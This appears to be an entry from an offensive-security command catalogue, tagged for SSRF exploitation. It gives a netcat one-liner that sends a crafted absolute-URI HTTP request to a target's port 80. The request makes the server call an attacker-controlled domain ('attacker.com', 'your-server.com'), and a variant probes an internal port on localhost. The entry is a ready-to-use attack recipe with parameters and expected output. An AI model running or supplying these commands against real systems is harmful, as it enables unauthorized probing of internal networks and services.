---
id: cmd-echo-nc-ssrf
data: >-
  echo -ne "GET http\\://your-server.com/ HTTP/1.1\\r\\n\\r\\n" | nc target-ip
  80
tags:
  - ssrf
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:10.071Z'
verified: false
validated: true
submitted: true
---
# echo-nc-ssrf-trigger

## Command

```bash
echo -ne "GET http\\://your-server.com/ HTTP/1.1\\r\\n\\r\\n" | nc target-ip 80
```

## Description

Sends a crafted minimal HTTP GET request with absolute URI via netcat to trigger SSRF on the target server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| your-server.com | Attacker's controlled domain/IP | Yes |
| target-ip | Target server's IP on port 80 | Yes |

## Examples

### Basic Usage

```bash
echo -ne "GET http\\://attacker.com/ HTTP/1.1\\r\\n\\r\\n" | nc 192.168.1.1 80
```

### Advanced Usage

For internal port: ```bash echo -ne "GET http://127.0.0.1:22/ HTTP/1.1\\r\\n\\r\\n" | nc target-ip 80 ```

## Expected Output

Target: HTTP/1.1 403 Forbidden. Attacker server: Logged GET request from target IP.

## Related

- [[commands/whois-ip-lookup]]
- [[procedures/Trigger-SSRF-with-Crafted-HTTP-Request]]
